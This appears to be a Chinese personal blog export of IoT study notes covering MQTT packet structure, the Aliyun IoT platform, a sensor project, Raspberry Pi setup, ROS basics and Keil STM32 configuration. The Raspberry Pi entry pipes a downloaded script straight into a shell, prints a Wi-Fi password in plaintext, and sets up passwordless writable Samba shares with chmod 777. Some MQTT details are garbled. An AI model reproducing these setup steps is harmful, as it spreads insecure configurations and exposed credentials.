<h2 id="数据的流程"><a href="#数据的流程" class="headerlink" title="数据的流程"></a>数据的流程</h2><p>数据从节点设备产生，到用户自己的服务器这一过程，我们把它分为两部分。前半部分是节点设备产生数据，经过网络传递到阿里云物联网平台，这一过程使用MQTT协议。后半部分则有阿里云物联网平台将数据转交给阿里云的其他产品，如用户自己的云平台。</p>
<p>节点接入的两种方式。<br>资源受限的节点设备。<br>使用Paho MQTT Client协议栈接入<br>没有TLS<br>透传模式<br>MQTT通信协议与服务器约定：</p>
<ul>
<li>消息负载的二进制表达</li>
<li>消息主题</li>
</ul>
<p>资源丰富的节点设备。<br>使用Linkkit SDK接入<br>FreeRTOS，Json，TLS<br>物模型<br>MQTT通信协议安装物模型规定（解耦设备端与应用端开发）</p>
<p>Web 后端<br>基于阿里云物联网平台HTTP&#x2F;2 SDK订阅设备数据<br>使用SpringBoot + Mybatis轻量级框架可开发服务端逻辑<br>MySQL存储设备数据</p>
<p>Web 前端<br>React<br>Umi.js Antd 框架组件<br>dva.js数据管理<br>Bizcharts数据可视化<br>定时向后端请求数据</p>
<p>软件<br>STM32CubeMX<br>IAR Embedded Workbench<br>Pahoo MQTT Client Stack<br>Linkkit C-SDK<br>MbedTLS<br>FreeRTOS</p>
<p>JDK 8<br>Intellij IDEA<br>Node.js<br>MySQL<br>Navicat for MySQL<br>VSCode<br>Git</p>
<h2 id="MQTT"><a href="#MQTT" class="headerlink" title="MQTT"></a>MQTT</h2><h3 id="MQTT-介绍"><a href="#MQTT-介绍" class="headerlink" title="MQTT 介绍"></a>MQTT 介绍</h3><p>MQTT（消息队列遥测传输）是一种基于TCP开发的协议，工作在应用层，使用异步通信模式，解耦通信双方。</p>
<p>MQTT协议具有许多优点，如可靠性，双向传输性，低开销，有序性，低带宽等，采用发布订阅模式。</p>
<p>MQTT协议中包含了四类关键字。</p>
<p>客户端（client）<br>服务器端&#x2F;代理（server&#x2F;broker）</p>
<p>会话（session）</p>
<p>消息（message）<br>主题（Topic）</p>
<p>订阅（subscribe）<br>发布（publish）</p>
<p>角色：代理，负责收发数据；发布者，发布消息到代理；订阅者，订阅消息，接收代理推送的消息。</p>
<p>发布者和订阅者通过不同的Topic进行消息的双向传输。二者可以从Topic中发布和订阅消息。</p>
<p>每个产品会定义Topic类，下属的所有设备都会生成相应的Topic。例如某设备的气压，温度，湿度等Topic。</p>
<h3 id="MQTT-协议格式"><a href="#MQTT-协议格式" class="headerlink" title="MQTT 协议格式"></a>MQTT 协议格式</h3><p>主题：主题具有层级结构，支持通配符。通配符有单级通配符<code>+</code>与多级通配符<code>#</code>。</p>
<p>连接与会话：连接由客户端发起，服务器根据连接参数（客户端ID，用户名，密码，心跳间隔，消息-主题-遗嘱，会话保持等）对客户端鉴权和授权，连接参数也将决定此次会话是否是持久会话。</p>
<p>MQTT报文格式：<br>固定报头：2~5 Bytes，是所有报文必须包含的（MSB在前，LSB在后）。</p>
<table>
<thead>
<tr>
<th>4 bits</th>
<th>1 bit</th>
<th>2 bits</th>
<th>1 bit</th>
<th>1 ~ 4 Bytes</th>
</tr>
</thead>
<tbody><tr>
<td>Message Type</td>
<td>UDP</td>
<td>QoS Level</td>
<td>RETAIN</td>
<td>Remaining Length</td>
</tr>
</tbody></table>
<p>可变报头：长度由Remaining Length决定；</p>
<p>有效载荷：长度由Remaining Length决定。</p>
<p>Message Type：共14种。<br>UDP，QoS Level，RETAIN：只有PUBLISH报文使用。<br>QoS：<br>0 – 最多收到一次，接收方不产生应答；<br>1 – 最少收到一次，接收方返回PUBACK报文；<br>2 – 保证仅收到一次，且消耗资源较大。<br>RETAIN：当客户端发送的消息中Retain置位，则服务器保留该条消息以及QoS级别，当有新的订阅发生，并与该消息主题一致，服务器就会马上把该Retain置位的消息转发给订阅者（相当于给订阅者写了留言，订阅者一上线就收到了这条消息）。服务器仅保留最近一个Retain置位的消息。删除Retain置位的消息是通过客户端发送一条Payload为空的Retain为空的消息。<br>Remaining Length：决定可变报头与有效载荷的总长度。</p>
<p>CONNECT – 连接报文（0x01）：</p>
<ul>
<li>可变报头</li>
</ul>
<p>|2 Bytes|4 Bytes|1 Byte|1 bit|1 bit|1 bit|2 bits|1 bit|1 bit|1 bit|2 Bytes|<br>|–|–|–|–|–|–|–|–|–|–|<br>|可变报头长度|MQTT|版本（0x03）|用户名Flag|密码Flag|Will Retail|Will QoS|Will Flag| Clean Session|保留|Keep Alive Timer|</p>
<p>标志位 为 1 时表示负载中包含该部分信息。</p>
<ul>
<li>负载</li>
</ul>
<table>
<thead>
<tr>
<th>1 Byte</th>
<th>1 Byte</th>
<th>1 Byte</th>
<th>1 Byte</th>
<th>1 Byte</th>
</tr>
</thead>
<tbody><tr>
<td>Client Indentifier</td>
<td>Will Topic</td>
<td>Will Message</td>
<td>用户名</td>
<td>密码</td>
</tr>
</tbody></table>
<p>遗嘱（Will）：是连接服务器时告诉服务器的消息，服务器会保存这些消息。当连接意外断开时，服务器会将遗嘱消息转发给所有订阅该设备上Topic的设备。</p>
<p>SUBSCRIBE – 订阅报文（0x08）：</p>
<ul>
<li>可变报头</li>
</ul>
<table>
<thead>
<tr>
<th>2 Bytes</th>
</tr>
</thead>
<tbody><tr>
<td>Message ID</td>
</tr>
</tbody></table>
<ul>
<li>负载</li>
</ul>
<table>
<thead>
<tr>
<th>2 Bytes</th>
<th>N Bytes</th>
<th>6 bits</th>
<th>2 bits</th>
</tr>
</thead>
<tbody><tr>
<td>Topic name String Length</td>
<td>Topic Name</td>
<td>保留</td>
<td>QoS Level</td>
</tr>
</tbody></table>
<p>QoS Level：作用于服务器到客户端的下行链路。</p>
<p>PUBLISH – 发布报文（0x03）：</p>
<ul>
<li>可变报头</li>
</ul>
<table>
<thead>
<tr>
<th>2 Bytes</th>
<th>N Bytes</th>
<th>2 Bytes</th>
</tr>
</thead>
<tbody><tr>
<td>Topic name String Length</td>
<td>Topic Name</td>
<td>Message ID</td>
</tr>
</tbody></table>
<ul>
<li>负载</li>
</ul>
<table>
<thead>
<tr>
<th>N Bytes</th>
</tr>
</thead>
<tbody><tr>
<td>Publish Message（可选）</td>
</tr>
</tbody></table>
<p>QoS Level：作用于客户端到服务器的上行链路。</p>
<p>UNSUBSCRIBE – 取消订阅（0xA）：<br>有可变头部和负载</p>
<p>PINGREQ – 发送心跳（0xC）：<br>无可变头部和负载</p>
<p>DISCONNECT – 断开连接（0xE）：<br>无可变头部和负载</p>
<h2 id="阿里云物联网平台"><a href="#阿里云物联网平台" class="headerlink" title="阿里云物联网平台"></a>阿里云物联网平台</h2><h3 id="物联网体系"><a href="#物联网体系" class="headerlink" title="物联网体系"></a>物联网体系</h3><h4 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h4><p>应用层主要包括了关于物联网的Web应用，例如智慧交通，智能家居等服务端应用，也包括物联网应用接口。</p>
<p>在阿里云物联网体系中还加入了阿里云物联网平台作为物联网应用的总接口。</p>
<h4 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h4><p>终端与应用层的各个应用通信，需要借助网络。例如：2&#x2F;3&#x2F;4G，NB-IoT，WiFi，蓝牙，LoRaWAN等。</p>
<h4 id="感知层"><a href="#感知层" class="headerlink" title="感知层"></a>感知层</h4><p>包括物联网终端设备，例如传感器，芯片，控制器，通信模组等。</p>
<h3 id="平台功能"><a href="#平台功能" class="headerlink" title="平台功能"></a>平台功能</h3><p>设备接入：支持多种通信协议，提供多种通信协议SDK，即可满足长连接，也满足短连接，提供多种入网接入访问。<br>设备通信：可以实现双向通信。<br>设备管理：支持完整的设备声明周期管理，包括设备注册，功能定义，脚本解析，在线调试，远程配置，固件升级，远程维护，实时监控，分组管理，设备删除等。提供上下线通知，数据存储，OTA升级，设备影子缓存（用于解决不可靠网络通信问题）。<br>安全能力：一机一密的设备认证，安全级别高；一型一密的安全机制，安全级别普通。支持TLS（HTTP，MQTT），DTLS（CoAP），安全级别高；支持TCP（MQTT），UDP（CoAP），安全级别普通。<br>数据转发：可配置规则实现设备与设备的通信；支持消息转发至消息队列，表格存储，流计算，TSDB，函数计算等应用中。</p>
<p>另外还有：<br>服务端订阅设备消息：平台数据可以通过HTTP&#x2F;2通道至服务器，并提供HTTP&#x2F;2 SDK，实现数据订阅功能。服务器也可以使用SDK传输数据至平台。</p>
<h3 id="产品"><a href="#产品" class="headerlink" title="产品"></a>产品</h3><p>产品是设备的集合，指通常具有相同功能的一组设备。每一个产品都有一个ProductKey。</p>
<h3 id="设备"><a href="#设备" class="headerlink" title="设备"></a>设备</h3><p>归属于某个产品之下，指具体的某一个终端。每一个设备都有一个DeviceName。</p>
<h3 id="设备直连"><a href="#设备直连" class="headerlink" title="设备直连"></a>设备直连</h3><p>设备直接连接物联网平台。</p>
<h3 id="网关连接"><a href="#网关连接" class="headerlink" title="网关连接"></a>网关连接</h3><p>网关：网关是可以直接连接物联网平台的设备，可以拥有子设备。网关是代理子设备连接云端的设备。</p>
<p>子设备：只能通过网关连接平台。</p>
<h3 id="三元组"><a href="#三元组" class="headerlink" title="三元组"></a>三元组</h3><p>平台会为每一台设备分配一个三元组。三元组内容如下：<br>ProductKey：产品标识，在全网具有唯一性。<br>DeviceName：设备标识，仅在产品维度内具有唯一性。<br>DeviceSecret：设备秘钥，与DeviceName成对出现。</p>
<h3 id="认证方案"><a href="#认证方案" class="headerlink" title="认证方案"></a>认证方案</h3><p>一共有三种认证方案：<br>一机一密：该方案要求设备事先烧录自己的三元组，在建立连接时，设备携带自己的三元组在平台上进行认证，认证通过后才可以传输数据。<br>一型一密：所有设备可以烧录相同的固件（ProductKey和DeviceName），设备在认证通过后接收自己的DeviceSecret。<br>子设备认证：网关联入平台后，子设备的认证方案。</p>
<h3 id="通信模式"><a href="#通信模式" class="headerlink" title="通信模式"></a>通信模式</h3><p>发布&#x2F;订阅模式：平台维护所有的Topic的发布&#x2F;订阅用户列表，当有发布者发布某Topic消息的时候，平台会在用户列表中查询所有订阅者，并将消息下发给订阅某Topic的订阅者。适用于非实时场景。</p>
<p>RRPC模式：基于MQTT协议封装的同步通信模式，服务端下发消息，设备可以同步得到响应。适用于实时场景。</p>
<h3 id="设备声明周期管理"><a href="#设备声明周期管理" class="headerlink" title="设备声明周期管理"></a>设备声明周期管理</h3><p>创建设备：在平台上创建设备。<br>激活设备：由设备申请激活。<br>启用设备：由平台控制设备的启用。<br>禁用设备：由平台控制设备的禁用。<br>删除设备：在平台上删除设备。</p>
<p>设备状态：可以查看设备是否激活，是否在线等。<br>设备标签：可以查看设备厂商、型号等。</p>
<h3 id="物模型"><a href="#物模型" class="headerlink" title="物模型"></a>物模型</h3><p>属性：设备运行状态，支持GET与SET服务，应用可以发起对属性的读取和设置请求。<br>服务：设备可以被外部调用的方法，可以设置输入参数与输出参数。<br>事件：设备运行时的事件在感知外部和处理通知消息后等激发，可以包含多个输出参数，如设备故障、完成某任务的消息等。事件可以被订阅和推送。</p>
<h3 id="消息流程"><a href="#消息流程" class="headerlink" title="消息流程"></a>消息流程</h3><p>终端设备 &lt;–&gt; MQTT协议 &lt;–&gt; 阿里云平台 &lt;–&gt; HTTP&#x2F;2协议 &lt;–&gt; 个人服务器 &lt;–&gt; HTTPS&#x2F;HTTP &lt;–&gt; 浏览器，用户终端</p>
<h3 id="设备管理"><a href="#设备管理" class="headerlink" title="设备管理"></a>设备管理</h3><p>查看数据：支持一次数据快照与历史数据查看。<br>固件升级：支持OTA升级。</p>
<h3 id="数据传输"><a href="#数据传输" class="headerlink" title="数据传输"></a>数据传输</h3><p>Alink协议接入：用于设备与云端的双向通信，格式为Json。<br>透传接入：设备直接上传二进制数据，云端对数据进行解析，并转化为Alink协议的格式。</p>
<h3 id="服务端订阅"><a href="#服务端订阅" class="headerlink" title="服务端订阅"></a>服务端订阅</h3><p>配置HTTP&#x2F;2服务端订阅后，物联网平台会将消息推送到服务端，服务端通过接入HTTP&#x2F;2 SDK后就可以接收物联网平台的消息。HTTP&#x2F;2 SDK提供身份认证，Topic订阅，消息发送和接收的能力，并支持设备接入和云端接入。HTTP&#x2F;2 SDK即适用于服务端与平台传输大量信息，也支持设备与物联网平台之间的消息传输。</p>
<h3 id="规则引擎"><a href="#规则引擎" class="headerlink" title="规则引擎"></a>规则引擎</h3><p>当设备基于Topic与平台进行消息通信时，用户可以通过规则引擎实现对设备数据的处理和转发，实现将数据转发至阿里云其他产品中。</p>
<p>转发支持转发到RDS，Table Store，HiTSDB等数据库，DataHub进行流计算、离线计算，函数计算，另一个Topic，消息队列五种形式。</p>
<h3 id="设备端开发"><a href="#设备端开发" class="headerlink" title="设备端开发"></a>设备端开发</h3><p>设备端开发SDK包含：</p>
<ul>
<li>C SDK</li>
<li>Android SDK</li>
<li>NodeJS SDK</li>
<li>Java SDK</li>
<li>Python SDK</li>
<li>iOS SDK</li>
</ul>
<h3 id="云端开发"><a href="#云端开发" class="headerlink" title="云端开发"></a>云端开发</h3><p>云端开发SDK支持</p>
<ul>
<li>Java</li>
<li>Python</li>
<li>PHP</li>
<li>.NET。</li>
</ul>
<p>API 包含：</p>
<ul>
<li>产品管理</li>
<li>设备管理</li>
<li>分组管理</li>
<li>规则引擎</li>
<li>Topic管理</li>
<li>消息通信</li>
<li>设备影子</li>
</ul>
<h2 id="温湿度传感器案例"><a href="#温湿度传感器案例" class="headerlink" title="温湿度传感器案例"></a>温湿度传感器案例</h2><h3 id="功能描述"><a href="#功能描述" class="headerlink" title="功能描述"></a>功能描述</h3><p>配置一个温湿度检测物联网终端设备，可以监测当前温湿度，可以配置温度阈值，当高于温度阈值时，发出报警。</p>
<p>设备方面：</p>
<ul>
<li>设备每5秒上报温湿度，闪烁绿灯；</li>
<li>温度超过阈值，亮红灯，并每10秒向用户报警一次；</li>
<li>收到用户解除警报信息后红灯闪烁；</li>
<li>温度正常后，灭掉红灯。</li>
</ul>
<p>平台方面：</p>
<ul>
<li>温湿度值转发到用户服务器，同时在Web端显示温湿度曲线；</li>
<li>报警消息转发到用户服务器，在Web端显示；</li>
<li>Web页面可以解除警报。</li>
<li>Web页面可以设置阈值。</li>
</ul>
<h3 id="物模型-1"><a href="#物模型-1" class="headerlink" title="物模型"></a>物模型</h3><p>属性：</p>
<ul>
<li>当前温度</li>
<li>当前湿度</li>
<li>温度阈值</li>
</ul>
<p>事件：</p>
<ul>
<li>属性达到上限</li>
<li>温度超过阈值</li>
</ul>
<p>服务：</p>
<ul>
<li>设置阈值</li>
<li>获取属性值</li>
<li>解除警报</li>
</ul>
<h3 id="项目流程"><a href="#项目流程" class="headerlink" title="项目流程"></a>项目流程</h3><p>节点方面：</p>
<ul>
<li>初始化<ul>
<li>系统初始化</li>
<li>平台初始化</li>
<li>MQTT连接参数计算</li>
<li>连接阿里物联网平台</li>
<li>订阅相关主题</li>
</ul>
</li>
<li>主循环<ul>
<li>MQTT连接是否正常</li>
<li>读取温湿度</li>
<li>判断是否报警</li>
<li>发布设备属性</li>
</ul>
</li>
<li>MQTT订阅回调函数<ul>
<li>收到设置阈值Topic消息<ul>
<li>更新温度阈值</li>
</ul>
</li>
<li>收到解除警报Topic消息<ul>
<li>解除警报</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="阿里云IoT平台配置"><a href="#阿里云IoT平台配置" class="headerlink" title="阿里云IoT平台配置"></a>阿里云IoT平台配置</h3><p>打开阿里物联网云平台页面，登录并进入产品管理页面。点击<code>创建产品</code>，选择<code>基础版</code>，输入<code>产品名称</code>，选择<code>设备</code>，认证选择<code>否</code>。</p>
<p>进入设备页面，点击<code>添加设备</code>，输入<code>设备名称</code>，就可以生产三元组了。</p>
<p>回到产品页面，在Topic类列表<code>定义Topic类</code>实现自定义Topic。</p>
<p>在<code>服务端订阅</code>中<code>设置</code>：<code>设备上报消息</code>与<code>设备状态变化通知</code>，点击保存。</p>
<h3 id="服务端应用开发"><a href="#服务端应用开发" class="headerlink" title="服务端应用开发"></a>服务端应用开发</h3><p>开发流程为：</p>
<ul>
<li>需求分析：功能、交互</li>
<li>系统设计：UI设计、API设计、数据库设计</li>
<li>编码开发：前端编码、后端编码</li>
<li>联调测试：功能测试、交互测试</li>
<li>系统运维：发布上线、持续运维</li>
</ul>
<p>后端开发流程</p>
<ul>
<li>数据库设计</li>
<li>API 约定</li>
<li>后端编写</li>
<li>前后端联调</li>
<li>部署上线运维</li>
</ul>
<p>框架</p>
<ul>
<li>MySQL</li>
<li>Mybatis：在Java中操作MySQL</li>
<li>SpringBoot：整合了MyBatis + SpringMVC等</li>
<li>Maven：跨平台项目管理工具</li>
</ul>
<h3 id="使用-IoT-Studio-快速开发"><a href="#使用-IoT-Studio-快速开发" class="headerlink" title="使用 IoT Studio 快速开发"></a>使用 IoT Studio 快速开发</h3><p>在IoT Studio中，用户可以快速构建Web应用，手机APP，以及后端服务。</p>
<p>进入<code>IoT Studio</code>，选择<code>开发服务</code>，<code>新建项目</code>，在<code>项目产品</code>和<code>项目设备</code>中<code>关联</code>自己的设备。</p>
<p>之后选择<code>Web可视化开发</code>或<code>移动应用开发</code>，编辑相关内容，生成应用程序。例如生成Android App，经过几分钟编译打包后，在<code>移动应用开发</code>界面的<code>设置</code>，<code>构建管理</code>中下载安装APP。</p>
]]></content>
      <categories>
        <category>物联网与硬件</category>
      </categories>
      <tags>
        <tag>物联网</tag>
        <tag>STM32</tag>
        <tag>阿里云</tag>
        <tag>NodeMCU</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派</title>
    <url>/2020/04/23/%E7%89%A9%E8%81%94%E7%BD%91/Respbrry/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>配置Wifi：<br>创建文件<code>wpa_supplicant.conf</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev</span><br><span class="line">network=&#123;</span><br><span class="line">  ssid=&quot;HUAWEI-QZZ7ZR&quot;</span><br><span class="line">  psk=&quot;@6212832@zxy&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置SSH：<br>创建一个空文件<code>ssh</code>（小写）。</p>
<p>如果还不行，配置<code>config.txt</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dtoverlay=pi3-miniuart-bt</span><br></pre></td></tr></table></figure>

<p>设置APT源：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/raspbian/raspbian/ buster main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/raspbian/raspbian/ buster main non-free contrib</span><br></pre></td></tr></table></figure>

<h2 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -sSl https://get.docker.com|sh</span><br><span class="line">sudo pip3 install docker-compose -i http://mirrors.aliyun.com/pypi/simple </span><br></pre></td></tr></table></figure>

<h2 id="安装Samba"><a href="#安装Samba" class="headerlink" title="安装Samba"></a>安装Samba</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get install samba</span><br></pre></td></tr></table></figure>

<p>配置文件<code>/etc/samba/smb.conf</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#### Debugging/Accounting ####</span></span><br><span class="line"><span class="comment"># share the dir without passwd</span></span><br><span class="line">    security = user</span><br><span class="line">    map to guest = Bad User</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在文件结尾添加如下行：</span></span><br><span class="line">[share]</span><br><span class="line">comment = this is Linux share directory</span><br><span class="line">path = /home/myth/share</span><br><span class="line">public = <span class="built_in">yes</span></span><br><span class="line">writable = <span class="built_in">yes</span></span><br><span class="line">browable = <span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line">[u pan]</span><br><span class="line">comment = this is Linux share directory</span><br><span class="line">path = /media/pi</span><br><span class="line">public = <span class="built_in">yes</span></span><br><span class="line">writable = <span class="built_in">yes</span></span><br><span class="line">browable = <span class="built_in">yes</span></span><br></pre></td></tr></table></figure>

<p>重启服务</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo systemctl restart smbd</span><br></pre></td></tr></table></figure>

<p>更改访问权限</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">chmod</span> 777 /media/pi</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>物联网与硬件</category>
      </categories>
      <tags>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title>ROS 基础</title>
    <url>/2019/04/13/%E7%89%A9%E8%81%94%E7%BD%91/Ros/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<p>近期做的东西和ROS有关，因此想做一些关于ROS的笔记。这篇文章主要分为以下几个部分。</p>
<blockquote>
<ol>
<li>ROS简介</li>
<li>ROS的工程架构</li>
<li>ROS的计算图集</li>
<li>ROS工具包</li>
<li>未完结</li>
</ol>
</blockquote>
<h2 id="1-ROS简介"><a href="#1-ROS简介" class="headerlink" title="1. ROS简介"></a>1. ROS简介</h2><p>ROS（Robot OS）是运行在Ubuntu上的次级系统，它内部由多个节点构成，每个节点即一个进程。这些节点之间各自分工，又相互合作，共同完成一些列任务。一般一个ROS工程由master节点和多个子节点构成，master负责管理各个节点，而子节点则负责各自具体的任务。</p>
<h2 id="2-ROS的工程架构"><a href="#2-ROS的工程架构" class="headerlink" title="2. ROS的工程架构"></a>2. ROS的工程架构</h2><p>对于一个ROS工程，它一般分为三部分：</p>
<ul>
<li>build：编译产生的中间文件；</li>
<li>devel：编译的结果文件；</li>
<li>src：源代码目录。</li>
</ul>
<p><strong>项目架构概览</strong></p>
<blockquote>
<ul>
<li>&#x2F;catkin_ws<ul>
<li>&#x2F;build</li>
<li>&#x2F;devel</li>
<li>&#x2F;src<ul>
<li>&#x2F;folder_1<ul>
<li>&#x2F;package_1</li>
<li>&#x2F;package_2</li>
</ul>
</li>
<li>&#x2F;folder_2<ul>
<li>&#x2F;package_3</li>
</ul>
</li>
<li>&#x2F;package_4</li>
<li>&#x2F;metapackage</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<p>一个ROS工程的src部分，是由一个个Package组成的。每个Package一般对应一个应用或是一个节点。另外还有一类特殊的Package，叫做Metapackage，即虚包，它们没有自己的内容，但是由很多依赖，因此常用来做功能集使用。</p>
<p><strong>Package架构概览</strong>：</p>
<blockquote>
<ul>
<li>&#x2F;package<ul>
<li>&#x2F;msg<ul>
<li>x.msg</li>
</ul>
</li>
<li>&#x2F;srv<ul>
<li>x.srv</li>
</ul>
</li>
<li>&#x2F;action<ul>
<li>x.action</li>
</ul>
</li>
<li>&#x2F;scripts<ul>
<li>x.py</li>
<li>x.sh</li>
</ul>
</li>
<li>&#x2F;launch<ul>
<li>x.launch</li>
</ul>
</li>
<li>&#x2F;config<ul>
<li>x.yaml</li>
</ul>
</li>
<li>&#x2F;include<ul>
<li>x.h</li>
</ul>
</li>
<li>&#x2F;src<ul>
<li>x.cpp</li>
</ul>
</li>
<li>&#x2F;other_dirs<ul>
<li>other_files</li>
</ul>
</li>
<li>CMakeLists.txt</li>
<li>package.xml</li>
</ul>
</li>
</ul>
</blockquote>
<p>ROS支持C++和Python开发。在一个Package下，script下一般存放python文件，src、include文件夹下面分别存放了c++的.cpp文件和.h文件。launch文件夹下存放了ROS的启动文件，这些启动文件描述了这个包的启动过程中需要定义的参数，需要依赖的其它的包等内容。config文件夹下存放了一些配置文件，通过yaml语言定义。ROS自带了三种通信方式，其中msg描述了通过topic方式通信过程中的数据格式，srv、action则分别保存了service和action通信的数据格式。</p>
<h2 id="3-ROS的计算图集"><a href="#3-ROS的计算图集" class="headerlink" title="3. ROS的计算图集"></a>3. ROS的计算图集</h2><p>计算图集，也叫通信架构，是ROS节点之间通信的工具。ROS节点之间的通信方式共有三种。</p>
<p><strong>Topic</strong><br>Topic是最常见的通信方式，topic是一个独立于节点的存在。每个节点既可以发布topic，也可以订阅topic。发布者会始终无条件的发布消息，所以不论有没有其他节点在订阅消息，都会按照一定频率发布topic。并且topic的发布者可以不只是一个节点，偶尔也会有多个节点在同一个topic上发布消息。当然，订阅topic的节点也可以是多个。</p>
<p>一个节点如果想发布topic，必须先创建一个msg，这个msg就像是一个结构体，节点可以在这个msg中存放一些数据，然后发布到topic上。另一个节点如果想订阅这个topic，就必须按照这个msg的结构进行监听。</p>
<p>msg文件结构</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">float32 x</span><br><span class="line">float32 y</span><br></pre></td></tr></table></figure>

<p><strong>Service</strong><br>当进行一些复杂的，计算量大的任务时，Topic却无法胜任这种情况了，因为Topic是不论有没有订阅者，发布者都会无条件发布消息，这就会导致大量的计算资源被浪费了。而Service这种通信方式正是弥补了这一缺陷。Service会根据服务请求者的请求，按需执行，因此大大节约了计算资源。</p>
<p>Service由服务的提供方提供相应服务，而请求方需要按照srv文件中定义的格式向服务提供方请求服务。</p>
<p>srv文件结构</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 请求格式</span></span><br><span class="line">uint32 id</span><br><span class="line">---</span><br><span class="line"><span class="comment">// 响应格式</span></span><br><span class="line">float32 x</span><br><span class="line">float32 y</span><br></pre></td></tr></table></figure>

<p><strong>Action</strong><br>对于一些执行时间较长的服务，服务的请求方还需要知道服务的实时进度。这时候Action就派上用场了。Action除了像服务那样按需执行外，在执行的过程中，也会按照一定的频率向请求方发送一些其他的数据，这些数据都是在action文件中定义的。</p>
<p>action文件结构</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 请求格式</span></span><br><span class="line">uint32 id</span><br><span class="line">---</span><br><span class="line"><span class="comment">// 结果格式</span></span><br><span class="line">float32 x</span><br><span class="line">float32 y</span><br><span class="line">---</span><br><span class="line"><span class="comment">// 中间反馈格式</span></span><br><span class="line"><span class="built_in">string</span> state</span><br></pre></td></tr></table></figure>

<p>数据格式文件中的数据类型</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span></span><br><span class="line"><span class="built_in">string</span></span><br><span class="line">int8, int16, int32, int64</span><br><span class="line">uint8, uint16, uint32, uint64</span><br><span class="line">float32, float64</span><br><span class="line">time, duration</span><br><span class="line">variable-length <span class="built_in">array</span>[], fixed-length <span class="built_in">array</span>[C]</span><br><span class="line">other msg files</span><br></pre></td></tr></table></figure>

<h2 id="4-ROS工具包"><a href="#4-ROS工具包" class="headerlink" title="4. ROS工具包"></a>4. ROS工具包</h2><p>Gazebo 物理仿真工具<br>可以对机器人进行物理仿真，可以对机器人设置重量，碰撞模型，转动惯量等设置。</p>
<p>Rviz 机器人可视化工具<br>主要用于机器人调试，数据可视化操作。</p>
<p>MoveIt! 机械臂路径规划工具<br>专门用于机械臂控制使用，里面集成了大量的关于机械臂的工具包。</p>
<p>Rqt ROS代码调试工具<br>提供了一系列代码调试工具：</p>
<blockquote>
<p>rqt_graph  绘制计算图（通信架构图）<br>rqt_plot 绘制数据变化曲线<br>rqt_console  查看日志的工具<br>rqt_*  其他工具</p>
</blockquote>
<h2 id="5-未完结（停止更新）"><a href="#5-未完结（停止更新）" class="headerlink" title="5. 未完结（停止更新）"></a>5. 未完结（停止更新）</h2>]]></content>
      <categories>
        <category>物联网与硬件</category>
      </categories>
      <tags>
        <tag>ROS</tag>
      </tags>
  </entry>
  <entry>
    <title>STM32</title>
    <url>/2020/02/12/%E7%89%A9%E8%81%94%E7%BD%91/STM32/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>


<h2 id="Keil-标准库"><a href="#Keil-标准库" class="headerlink" title="Keil 标准库"></a>Keil 标准库</h2><h3 id="创建STM32F103工程"><a href="#创建STM32F103工程" class="headerlink" title="创建STM32F103工程"></a>创建STM32F103工程</h3><p>首先创建一个项目目录：</p>
<ul>
<li>STM32F103RBT<ul>
<li>Project</li>
<li>User</li>
<li>Device</li>
<li>Driver</li>
</ul>
</li>
</ul>
<p>打开Keil，选择上方的<code>Project</code>-&gt;<code>New uVersion Project</code>，在Project目录下创建工程文件。在打开的面板左侧选择版型，这里选择<code>STM32F1 Series</code>-&gt;<code>STM32F103</code>-&gt;<code>STM32F103C8</code>。</p>
<p>下一步会弹出<code>Manage Run-Time Environment</code>，这里是选择外设的地方。<br>这里选择需要的库：</p>
<ul>
<li>CMSIS<ul>
<li>CORE</li>
</ul>
</li>
<li>Device<ul>
<li>DMA</li>
<li>GPIO</li>
<li>Startup</li>
<li>StdPeriph Drivers<ul>
<li>ADC</li>
<li>Framework</li>
<li>RCC</li>
<li>DMA</li>
<li>EXIT</li>
<li>GPIO</li>
<li>DGBMCU</li>
<li>TIM</li>
<li>SPI</li>
<li>USART</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>创建完成后打开<code>Options for Target</code>，在<code>C/C++</code>选项卡的<code>Define</code>项填写：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">STM32F10X_MD,USE_STDPERIPH_DRIVER</span><br></pre></td></tr></table></figure>

<p>前一项表示板子的类型，由与是C8板，因此是MD型；如果是Z系列或V系列，则为HD型。<br>后一项表示使用标准库。</p>
<p>在<code>Include Paths</code>中填写，这里是<code>.h</code>文件的搜索路径</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">..\Device;..\Driver;..\User;..\Project;..\UCOS;..\UCOS\core;..\UCOS\cpu;..\UCOS\lib</span><br></pre></td></tr></table></figure>

